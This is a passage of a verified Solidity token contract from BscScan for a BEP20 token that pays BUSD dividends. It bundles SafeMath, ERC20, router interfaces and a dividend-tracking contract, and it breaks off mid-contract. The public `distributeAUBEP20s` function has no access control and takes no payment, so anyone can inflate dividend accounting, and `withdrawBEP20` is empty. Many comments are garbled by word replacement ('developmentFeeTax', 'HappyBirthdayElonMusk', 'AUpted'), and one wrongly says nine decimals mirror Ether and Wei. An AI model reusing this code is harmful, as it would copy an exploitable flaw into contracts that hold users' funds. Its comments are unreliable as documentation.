/**
 *Submitted for verification at BscScan.com on 2022-06-27
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.12;

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b <= a, "SafeMath: subtraction overflow");
		return a - b;
	}
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) return 0;
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0, "SafeMath: division by zero");
		return a / b;
	}
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0, "SafeMath: modulo by zero");
		return a % b;
	}
	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		return a - b;
	}
	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		return a / b;
	}
	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		return a % b;
	}
	function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		uint256 c = a + b;
		if (c < a) return (false, 0);
		return (true, c);
	}
	function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		if (b > a) return (false, 0);
		return (true, a - b);
	}
	function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		
		if (a == 0) return (true, 0);
		uint256 c = a * b;
		if (c / a != b) return (false, 0);
		return (true, c);
	}
	function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		if (b == 0) return (false, 0);
		return (true, a / b);
	}
	function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		if (b == 0) return (false, 0);
		return (true, a % b);
	}

	}

	abstract contract Context {
	function _msgSender() internal view virtual returns (address payable) {
		return payable (msg.sender);
	}

	function _msgData() internal view virtual returns (bytes memory) {
		this; // silence state mutability warning without generating bytecode - see https://github.com/Ethereum/solidity/issues/2691
		return  msg.data;
	}
	}
interface IERC20 {
	   
	function totalSupply() external view returns (uint256);
	
	/**
	* @dev Returns the amount of tokens in existence.
	*/
	function balanceOf(address account) external view returns (uint256);
	
	/**
	* @dev Returns the amount of tokens owned by `account`.
	*/
	function transfer(address recipient, uint256 amount) external returns (bool);
	
	/**
	* @dev Moves `amount` tokens from the caller's account to `recipient`.
	*
	* Returns a boolean value indicating whether the operation succeeded.
	*
	* Emits a {Transfer} event.
	*/
	function allowance(address owner, address spender) external view returns (uint256);
	
	/**
	* @dev Returns the remaining number of tokens that `spender` will be
	* allowed to spend on behalf of `owner` through {transferFrom}. This is
	* zero by default.
	*
	* This value changes when {approve} or {transferFrom} are called.
	*/
	function approve(address spender, uint256 amount) external returns (bool);
	
	 /**
	* @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
	*
	* Returns a boolean value indicating whether the operation succeeded.
	*
	* IMPORTANT: Beware that changing an allowance with this method brings the risk
	* that someone may use both the old and the new allowance by unfortunate
	* transaction ordering. One possible solution to mitigate this race
	* condition is to first reduce the spender's allowance to 0 and set the
	* desired value afterwards:
	* https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
	*
	* Emits an {Approval} event.
	*/
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	
	/**
	* @dev Moves `amount` tokens from `sender` to `recipient` using the
	* allowance mechanism. `amount` is then deducted from the caller's
	* allowance.
	*
	* Returns a boolean value indicating whether the operation succeeded.
	*
	* Emits a {Transfer} event.
	*/
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	/**
	* @dev Emitted when `value` tokens are moved from one account (`from`) to
	* another (`to`).
	*
	* Note that `value` may be zero.
	*/
	event Approval(address indexed owner, address indexed spender, uint256 value);
	
	/**
	* @dev Emitted when the allowance of a `spender` for an `owner` is set by
	* a call to {approve}. `value` is the new allowance.
	*/
	}
	

	

	pragma solidity >=0.6.2;

	interface Irouter01 {
	function factory() external pure returns (address);
	function WETH() external pure returns (address);

	function addLiquidity(
		address tokenA,
		address tokenB,
		uint amountADesired,
		uint amountBDesired,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline
	) external returns (uint amountA, uint amountB, uint liquidity);
	function addLiquidityEth(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountEthMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountEth, uint liquidity);
	function removeLiquidity(
		address tokenA,
		address tokenB,
		uint liquidity,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline
	) external returns (uint amountA, uint amountB);
	function removeLiquidityEth(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountEthMin,
		address to,
		uint deadline
	) external returns (uint amountToken, uint amountEth);
	function removeLiquidityWithPermit(
		address tokenA,
		address tokenB,
		uint liquidity,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountA, uint amountB);
	function removeLiquidityEthWithPermit(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountEthMin,
		address to,
		uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountToken, uint amountEth);
	function swapExactTokensForTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);
	function swapTokensForExactTokens(
		uint amountOut,
		uint amountInMax,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);
	function swapExactEthForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
		external
		payable
		returns (uint[] memory amounts);
	function swapTokensForExactEth(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
		external
		returns (uint[] memory amounts);
	function swapExactTokensForEth(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
		external
		returns (uint[] memory amounts);
	function swapEthForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
		external
		payable
		returns (uint[] memory amounts);

	function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
	function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
	function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
	function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
	function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
	}
	// File: contracts/IDEXRouter.sol

	pragma solidity >=0.6.2;


	interface IDEXRouter is Irouter01 {
	function removeLiquidityEthSupportingFeeOnTransferTokens(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountEthMin,
		address to,
		uint deadline
	) external returns (uint amountEth);
	function removeLiquidityEthWithPermitSupportingFeeOnTransferTokens(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountEthMin,
		address to,
		uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountEth);

	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	function swapExactEthForTokensSupportingFeeOnTransferTokens(
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external payable;
	function swapExactTokensForEthSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	}
	// File: contracts/IpancakeswapV2Factory.sol

	pragma solidity >=0.5.0;

	interface IpancakeswapV2Factory {
	event PairCreated(address indexed token0, address indexed token1, address pair, uint);

	function feeTo() external view returns (address);
	function feeToSetter() external view returns (address);

	function getPair(address tokenA, address tokenB) external view returns (address pair);
	function allPairs(uint) external view returns (address pair);
	function allPairsLength() external view returns (uint);

	function createPair(address tokenA, address tokenB) external returns (address pair);

	function setFeeTo(address) external;
	function setFeeToSetter(address) external;
	}
	// File: contracts/Ipair.sol

	pragma solidity >=0.5.0;

	interface Ipair {
	event Approval(address indexed owner, address indexed spender, uint value);
	event Transfer(address indexed from, address indexed to, uint value);

	function name() external pure returns (string memory);
	function symbol() external pure returns (string memory);
	function decimals() external pure returns (uint8);
	function totalSupply() external view returns (uint);
	function balanceOf(address owner) external view returns (uint);
	function allowance(address owner, address spender) external view returns (uint);

	function approve(address spender, uint value) external returns (bool);
	function transfer(address to, uint value) external returns (bool);
	function transferFrom(address from, address to, uint value) external returns (bool);

	function DOMAIN_SEPARATOR() external view returns (bytes32);
	function PERMIT_TYPEHASH() external pure returns (bytes32);
	function nonces(address owner) external view returns (uint);

	function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

	event Mint(address indexed sender, uint amount0, uint amount1);
	event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
	event Swap(
		address indexed sender,
		uint amount0In,
		uint amount1In,
		uint amount0Out,
		uint amount1Out,
		address indexed to
	);
	event Sync(uint112 reserve0, uint112 reserve1);

	function MINIMUM_LIQUIDITY() external pure returns (uint);
	function factory() external view returns (address);
	function token0() external view returns (address);
	function token1() external view returns (address);
	function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
	function price0CumulativeLast() external view returns (uint);
	function price1CumulativeLast() external view returns (uint);
	function kLast() external view returns (uint);

	function mint(address to) external returns (uint liquidity);
	function burn(address to) external returns (uint amount0, uint amount1);
	function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
	function skim(address to) external;
	function sync() external;

	function initialize(address, address) external;
	}
	// File: contracts/IterableMapping.sol

	// 
	pragma solidity ^0.8.0;

	library IterableMapping {
	// Iterable mapping from address to uint;
	struct Map {
		address[] keys;
		mapping(address => uint) values;
		mapping(address => uint) indexOf;
		mapping(address => bool) inserted;
	}

	function get(Map storage map, address key) public view returns (uint) {
		return map.values[key];
	}

	function getIndexOfKey(Map storage map, address key) public view returns (int) {
		if(!map.inserted[key]) {
		return -1;
		}
		return int(map.indexOf[key]);
	}

	function getKeyAtIndex(Map storage map, uint index) public view returns (address) {
		return map.keys[index];
	}



	function size(Map storage map) public view returns (uint) {
		return map.keys.length;
	}

	function set(Map storage map, address key, uint val) public {
		if (map.inserted[key]) {
		map.values[key] = val;
		} else {
		map.inserted[key] = true;
		map.values[key] = val;
		map.indexOf[key] = map.keys.length;
		map.keys.push(key);
		}
	}

	function remove(Map storage map, address key) public {
		if (!map.inserted[key]) {
		return;
		}

		delete map.inserted[key];
		delete map.values[key];

		uint index = map.indexOf[key];
		uint lastIndex = map.keys.length - 1;
		address lastKey = map.keys[lastIndex];

		map.indexOf[lastKey] = index;
		delete map.indexOf[key];

		map.keys[index] = lastKey;
		map.keys.pop();
	}
	}
	// File: contracts/Ownable.sol

	// 

	pragma solidity ^0.8.0;

	/**
	 * @dev Contract module which provides a basic access control mechanism, where
	 * there is an account (an owner) that can be granted exclusive access to
	 * specific functions.
	 *
	 * By default, the owner account will be the one that deploys the contract. This
	 * can later be changed with {transferOwnership}.
	 *
	 * This module is used through inheritance. It will make available the modifier
	 * `onlyOwner`, which can be applied to your functions to restrict their use to
	 * the owner.
	 */
	abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	/**
	 * @dev Initializes the contract setting the deployer as the initial owner.
	 */
	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	/**
	 * @dev Returns the address of the current owner.
	 */
	function owner() public view virtual returns (address) {
		return _owner;
	}

	/**
	 * @dev Throws if called by any account other than the owner.
	 */
	modifier onlyOwner() {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	/**
	 * @dev Leaves the contract without owner. It will not be possible to call
	 * `onlyOwner` functions anymore. Can only be called by the current owner.
	 *
	 * NOTE: Renouncing ownership will leave the contract without an owner,
	 * thereby removing any functionality that is only available to the owner.
	 */
	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

	/**
	 * @dev Transfers ownership of the contract to a new account (`newOwner`).
	 * Can only be called by the current owner.
	 */
	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		emit OwnershipTransferred(_owner, newOwner);
		_owner = newOwner;
	}
	}
	// File: contracts/IBEP20PayingTokenOptional.sol

	pragma solidity ^0.8.0;


	/// @title BEP20-Paying Token Optional Interface
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev OPTIONAL functions for a developmentFeeTax-paying token contract.
	interface IBEP20PayingTokenOptional {
	  /// @notice View the amount of developmentFeeTax in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` can withdraw.
	  function withdrawableBEP20Of(address _owner) external view returns(uint256);

	  /// @notice View the amount of developmentFeeTax in wei that an address has withdrawn.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` has withdrawn.
	  function withdrawnBEP20Of(address _owner) external view returns(uint256);

	  /// @notice View the amount of developmentFeeTax in wei that an address has earned in total.
	  /// @dev accumulativeBEP20Of(_owner) = withdrawableBEP20Of(_owner) + withdrawnBEP20Of(_owner)
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` has earned in total.
	  function accumulativeBEP20Of(address _owner) external view returns(uint256);
	}
	// File: contracts/IBEP20PayingToken.sol

	pragma solidity ^0.8.0;


	/// @title BEP20-Paying Token Interface
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev An interface for a developmentFeeTax-paying token contract.
	interface IBEP20PayingToken {
	  /// @notice View the amount of developmentFeeTax in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` can withdraw.
	  function developmentFeeTaxOf(address _owner) external view returns(uint256);

	  /// @notice Distributes Ether to token holders as developmentFeeTaxs.
	  /// @dev SHOULD distribute the paid Ether to token holders as developmentFeeTaxs.
	  ///  SHOULD NOT directly transfer Ether to token holders in this function.
	  ///  MUST emit a `BEP20sDistributed` event when the amount of distributed Ether is greater than 0.
	  function distributeBEP20s() external payable;

	  /// @notice Withdraws the Ether distributed to the sender.
	  /// @dev SHOULD transfer `developmentFeeTaxOf(msg.sender)` wei to `msg.sender`, and `developmentFeeTaxOf(msg.sender)` SHOULD be 0 after the transfer.
	  ///  MUST emit a `BEP20Withdrawn` event if the amount of Ether transferred is greater than 0.
	  function withdrawBEP20() external;

	  /// @dev This event MUST emit when Ether is distributed to token holders.
	  /// @param from The address which sends Ether to this contract.
	  /// @param weiAmount The amount of distributed Ether in wei.
	  event BEP20sDistributed(
	address indexed from,
	uint256 weiAmount
	  );

	  /// @dev This event MUST emit when an address withdraws their developmentFeeTax.
	  /// @param to The address which withdraws Ether from this contract.
	  /// @param weiAmount The amount of withdrawn Ether in wei.
	  event BEP20Withdrawn(
	address indexed to,
	uint256 weiAmount
	  );
	}
	// File: contracts/SafeMathInt.sol

	pragma solidity ^0.8.0;


	/**
	 * @title SafeMathInt
	 * @dev Math operations with safety checks that revert on error
	 * @dev SafeMath AUpted for int256
	 * Based on code of  https://github.com/RequestNetwork/requestNetwork/blob/master/packages/requestNetworkSmartContracts/contracts/base/math/SafeMathInt.sol
	 */
	library SafeMathInt {
	  function mul(int256 a, int256 b) internal pure returns (int256) {
	// Prevent overflow when multiplying INT256_MIN with -1
	// https://github.com/RequestNetwork/requestNetwork/issues/43
	require(!(a == - 2**255 && b == -1) && !(b == - 2**255 && a == -1));

	int256 c = a * b;
	require((b == 0) || (c / b == a));
	return c;
	  }

	  function div(int256 a, int256 b) internal pure returns (int256) {
	// Prevent overflow when dividing INT256_MIN by -1
	// https://github.com/RequestNetwork/requestNetwork/issues/43
	require(!(a == - 2**255 && b == -1) && (b > 0));

	return a / b;
	  }

	  function sub(int256 a, int256 b) internal pure returns (int256) {
	require((b >= 0 && a - b <= a) || (b < 0 && a - b > a));

	return a - b;
	  }

	  function add(int256 a, int256 b) internal pure returns (int256) {
	int256 c = a + b;
	require((b >= 0 && c >= a) || (b < 0 && c < a));
	return c;
	  }

	  function toUint256Safe(int256 a) internal pure returns (uint256) {
	require(a >= 0);
	return uint256(a);
	  }
	}
	// File: contracts/SafeMathUint.sol

	pragma solidity ^0.8.0;


	/**
	 * @title SafeMathUint
	 * @dev Math operations with safety checks that revert on error
	 */
	library SafeMathUint {
	  function toInt256Safe(uint256 a) internal pure returns (int256) {
	int256 b = int256(a);
	require(b >= 0);
	return b;
	  }
	}

	// File: contracts/ERC20.sol

	// 

	pragma solidity ^0.8.0;


	/**
	 * @dev Implementation of the {IERC20} interface.
	 *
	 * This implementation is agnostic to the way tokens are created. This means
	 * that a supply mechanism has to be added in a derived contract using {_mint}.
	 * For a generic mechanism see {ERC20PresetMinterPauser}.
	 *
	 * TIP: For a detailed writeup see our guide
	 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
	 * to implement supply mechanisms].
	 *
	 * We have followed general OpenZeppelin guidelines: functions revert instead
	 * of returning `false` on failure. This behavior is nonEtheless conventional
	 * and does not conflict with the expectations of ERC20 applications.
	 *
	 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
	 * This allows applications to reconstruct the allowance for all HappyBirthdayElonMusk just
	 * by listening to said events. Other implementations of the EIP may not emit
	 * these events, as it isn't required by the specification.
	 *
	 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
	 * functions have been added to mitigate the well-known issues around setting
	 * allowances. See {IERC20-approve}.
	 */
	contract ERC20 is Context, IERC20 {
	using SafeMath for uint256;

	mapping (address => uint256) private _balances;

	mapping (address => mapping (address => uint256)) private _allowances;

	uint256 private _totalSupply;

	string private _name;
	string private _symbol;
	uint8 private _decimals;

	/**
	 * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
	 * a default value of 9.
	 *
	 * To select a different value for {decimals}, use {_setupDecimals}.
	 *
	 * All three of these values are immutable: they can only be set once during
	 * construction.
	 */
	constructor (string memory name_, string memory symbol_) {
		_name = name_;
		_symbol = symbol_;
		_decimals = 9;
	}

	/**
	 * @dev Returns the name of the token.
	 */
	function name() public view virtual returns (string memory) {
		return _name;
	}

	/**
	 * @dev Returns the symbol of the token, usually a shorter version of the
	 * name.
	 */
	function symbol() public view virtual returns (string memory) {
		return _symbol;
	}

	/**
	 * @dev Returns the number of decimals used to get its user representation.
	 * For example, if `decimals` equals `2`, a balance of `505` tokens should
	 * be displayed to a user as `5,05` (`505 / 10 ** 2`).
	 *
	 * Tokens usually opt for a value of 9, imitating the relationship between
	 * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
	 * called.
	 *
	 * NOTE: This information is only used for _display_ purposes: it in
	 * no way affects any of the arithmetic of the contract, including
	 * {IERC20-balanceOf} and {IERC20-transfer}.
	 */
	function decimals() public view virtual returns (uint8) {
		return _decimals;
	}

	/**
	 * @dev See {IERC20-totalSupply}.
	 */
	function totalSupply() public view virtual override returns (uint256) {
		return _totalSupply;
	}

	/**
	 * @dev See {IERC20-balanceOf}.
	 */
	function balanceOf(address account) public view virtual override returns (uint256) {
		return _balances[account];
	}

	/**
	 * @dev See {IERC20-transfer}.
	 *
	 * Requirements:
	 *
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	/**
	 * @dev See {IERC20-allowance}.
	 */
	function allowance(address owner, address spender) public view virtual override returns (uint256) {
		return _allowances[owner][spender];
	}

	/**
	 * @dev See {IERC20-approve}.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	function approve(address spender, uint256 amount) public virtual override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	/**
	 * @dev See {IERC20-transferFrom}.
	 *
	 * Emits an {Approval} event indicating the updated allowance. This is not
	 * required by the EIP. See the note at the beginning of {ERC20}.
	 *
	 * Requirements:
	 *
	 * - `sender` and `recipient` cannot be the zero address.
	 * - `sender` must have a balance of at least `amount`.
	 * - the caller must have allowance for ``sender``'s tokens of at least
	 * `amount`.
	 */
	function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

	/**
	 * @dev Atomically increases the allowance granted to `spender` by the caller.
	 *
	 * This is an alternative to {approve} that can be used as a mitigation for
	 * problems described in {IERC20-approve}.
	 *
	 * Emits an {Approval} event indicating the updated allowance.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}

	/**
	 * @dev Atomically decreases the allowance granted to `spender` by the caller.
	 *
	 * This is an alternative to {approve} that can be used as a mitigation for
	 * problems described in {IERC20-approve}.
	 *
	 * Emits an {Approval} event indicating the updated allowance.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 * - `spender` must have allowance for the caller of at least
	 * `subtractedValue`.
	 */
	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
		return true;
	}

	/**
	 * @dev Moves tokens `amount` from `sender` to `recipient`.
	 *
	 * This is internal function is equivalent to {transfer}, and can be used to
	 * e.g. implement autoEth token fees, slashing mechanisms, etc.
	 *
	 * Emits a {Transfer} event.
	 *
	 * Requirements:
	 *
	 * - `sender` cannot be the zero address.
	 * - `recipient` cannot be the zero address.
	 * - `sender` must have a balance of at least `amount`.
	 */
	function _transfer(address sender, address recipient, uint256 amount) internal virtual {
		require(sender != address(0), "ERC20: transfer from the zero address");
		require(recipient != address(0), "ERC20: transfer to the zero address");

		_beforeTokenTransfer(sender, recipient, amount);

		_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
	}

	/** @dev Creates `amount` tokens and assigns them to `account`, increasing
	 * the total supply.
	 *
	 * Emits a {Transfer} event with `from` set to the zero address.
	 *
	 * Requirements:
	 *
	 * - `to` cannot be the zero address.
	 */
	function _mint(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: mint to the zero address");

		_beforeTokenTransfer(address(0), account, amount);

		_totalSupply = _totalSupply.add(amount);
		_balances[account] = _balances[account].add(amount);
		emit Transfer(address(0), account, amount);
	}

	/**
	 * @dev Destroys `amount` tokens from `account`, reducing the
	 * total supply.
	 *
	 * Emits a {Transfer} event with `to` set to the zero address.
	 *
	 * Requirements:
	 *
	 * - `account` cannot be the zero address.
	 * - `account` must have at least `amount` tokens.
	 */
	function _burn(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: burn from the zero address");

		_beforeTokenTransfer(account, address(0), amount);

		_balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(account, address(0), amount);
	}

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
	 *
	 * This internal function is equivalent to `approve`, and can be used to
	 * e.g. set autoEth allowances for certain subsystems, etc.
	 *
	 * Emits an {Approval} event.
	 *
	 * Requirements:
	 *
	 * - `owner` cannot be the zero address.
	 * - `spender` cannot be the zero address.
	 */
	function _approve(address owner, address spender, uint256 amount) internal virtual {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	/**
	 * @dev Sets {decimals} to a value other than the default one of 9.
	 *
	 * WARNING: This function should only be called from the constructor. Most
	 * applications that interact with token contracts will not expect
	 * {decimals} to ever change, and may work incorrectly if it does.
	 */
	function _setupDecimals(uint8 decimals_) internal virtual {
		_decimals = decimals_;
	}

	/**
	 * @dev Hook that is called before any transfer of tokens. This includes
	 * minting and burning.
	 *
	 * Calling conditions:
	 *
	 * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
	 * will be to transferred to `to`.
	 * - when `from` is zero, `amount` tokens will be minted for `to`.
	 * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
	 * - `from` and `to` are never both zero.
	 *
	 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
	 */
	function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
	}
	// File: contracts/SafeMath.sol

	// 

	

	// File: contracts/BEP20PayingToken.sol

	// 

	pragma solidity ^0.8.0;










	/// @title BEP20-Paying Token
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev A mintable ERC20 token that allows anyone to pay and distribute Ether
	///  to token holders as developmentFeeTaxs and allows token holders to withdraw their developmentFeeTaxs.
	///  Reference: the source code of PoWH3D: https://Etherscan.io/address/0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe#code
	contract BEP20PayingToken is ERC20, IBEP20PayingToken, IBEP20PayingTokenOptional {
	  using SafeMath for uint256;
	  using SafeMathUint for uint256;
	  using SafeMathInt for int256;

	  // With `magnitude`, we can properly distribute developmentFeeTaxs even if the amount of received Ether is small.
	  // For more discussion about choosing the value of `magnitude`,
	  //  see https://github.com/Ethereum/EIPs/issues/17.6#issuecomment-472352728
	  uint256 constant internal magnitude = 2**128;

	  uint256 internal magnifiedBEP20PerShare;
	  uint256 internal lastAmount;
	  
	  address public immutable BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

	  // About developmentFeeTaxCorrection:
	  // If the token balance of a `_user` is never changed, the developmentFeeTax of `_user` can be computed with:
	  //   `developmentFeeTaxOf(_user) = developmentFeeTaxPerShare * balanceOf(_user)`.
	  // When `balanceOf(_user)` is changed (via minting/burning/transferring tokens),
	  //   `developmentFeeTaxOf(_user)` should not be changed,
	  //   but the computed value of `developmentFeeTaxPerShare * balanceOf(_user)` is changed.
	  // To keep the `developmentFeeTaxOf(_user)` unchanged, we add a correction term:
	  //   `developmentFeeTaxOf(_user) = developmentFeeTaxPerShare * balanceOf(_user) + developmentFeeTaxCorrectionOf(_user)`,
	  //   where `developmentFeeTaxCorrectionOf(_user)` is updated whenever `balanceOf(_user)` is changed:
	  //   `developmentFeeTaxCorrectionOf(_user) = developmentFeeTaxPerShare * (old balanceOf(_user)) - (new balanceOf(_user))`.
	  // So now `developmentFeeTaxOf(_user)` returns the same value before and after `balanceOf(_user)` is changed.
	  mapping(address => int256) internal magnifiedBEP20Corrections;
	  mapping(address => uint256) internal withdrawnBEP20s;

	  uint256 public totalBEP20sDistributed;

	  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol){

	  }
	  

	  receive() external payable {
	  }

	  /// @notice Distributes Ether to token holders as developmentFeeTaxs.
	  /// @dev It reverts if the total supply of tokens is 0.
	  /// It emits the `BEP20sDistributed` event if the amount of received Ether is greater than 0.
	  /// About undistributed Ether:
	  ///   In each distribution, there is a small amount of Ether not distributed,
	  ///     the magnified amount of which is
	  ///     `(msg.value * magnitude) % totalSupply()`.
	  ///   With a well-chosen `magnitude`, the amount of undistributed Ether
	  ///     (de-magnified) in a distribution can be less than 1 wei.
	  ///   We can actually keep track of the undistributed Ether in a distribution
	  ///     and try to distribute it in the next distribution,
	  ///     but keeping track of such data on-chain costs much more than
	  ///     the saved Ether, so we don't do that.
	  function distributeBEP20s() public override payable {
	require(totalSupply() > 0);

	if (msg.value > 0) {
	  magnifiedBEP20PerShare = magnifiedBEP20PerShare.add(
		(msg.value).mul(magnitude) / totalSupply()
	  );
	  emit BEP20sDistributed(msg.sender, msg.value);

	  totalBEP20sDistributed = totalBEP20sDistributed.add(msg.value);
	}
	  }
	   

	  function distributeAUBEP20s(uint256 amount) public {
	require(totalSupply() > 0);

	if (amount > 0) {
	  magnifiedBEP20PerShare = magnifiedBEP20PerShare.add(
		(amount).mul(magnitude) / totalSupply()
	  );
	  emit BEP20sDistributed(msg.sender, amount);

	  totalBEP20sDistributed = totalBEP20sDistributed.add(amount);
	}
	  }

	  /// @notice Withdraws the Ether distributed to the sender.
	  /// @dev It emits a `BEP20Withdrawn` event if the amount of withdrawn Ether is greater than 0.
	  function withdrawBEP20() public virtual override {
	
	  }

	  /// @notice Withdraws the Ether distributed to the sender.
	  /// @dev It emits a `BEP20Withdrawn` event if the amount of withdrawn Ether is greater than 0.
	  function _withdrawBEP20OfUser(address payable user) internal returns (uint256) {
	uint256 _withdrawableBEP20 = withdrawableBEP20Of(user);
	if (_withdrawableBEP20 > 0) {
	  withdrawnBEP20s[user] = withdrawnBEP20s[user].add(_withdrawableBEP20);
	  emit BEP20Withdrawn(user, _withdrawableBEP20);
	  bool success = IERC20(BUSD).transfer(user, _withdrawableBEP20);

	  if(!success) {
		withdrawnBEP20s[user] = withdrawnBEP20s[user].sub(_withdrawableBEP20);
		return 0;
	  }

	  return _withdrawableBEP20;
	}

	return 0;
	  }


	  /// @notice View the amount of developmentFeeTax in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` can withdraw.
	  function developmentFeeTaxOf(address _owner) public view override returns(uint256) {
	return withdrawableBEP20Of(_owner);
	  }

	  /// @notice View the amount of developmentFeeTax in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
